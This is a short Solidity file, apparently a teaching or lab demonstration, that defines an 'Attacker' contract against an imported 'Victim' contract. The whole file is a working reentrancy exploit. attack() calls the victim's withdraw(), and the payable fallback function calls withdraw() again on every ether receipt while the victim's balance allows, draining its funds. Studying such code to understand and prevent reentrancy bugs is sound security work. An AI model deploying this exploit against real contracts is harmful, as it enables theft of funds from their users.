pragma solidity ^0.5.0;

import './Victim.sol';

contract Attacker {
  Victim victim;
  address payable victimAddress;

  constructor(address payable _victimAddress) public{
    victim = Victim(_victimAddress);
    victimAddress = _victimAddress;
  }

  function attack() external {
    victim.withdraw();
  }

  // Fallback function which is called whenever Attacker receives ether
  function () payable external{
    if (address(victim).balance >= msg.value) {
      victim.withdraw();
    }
  }
}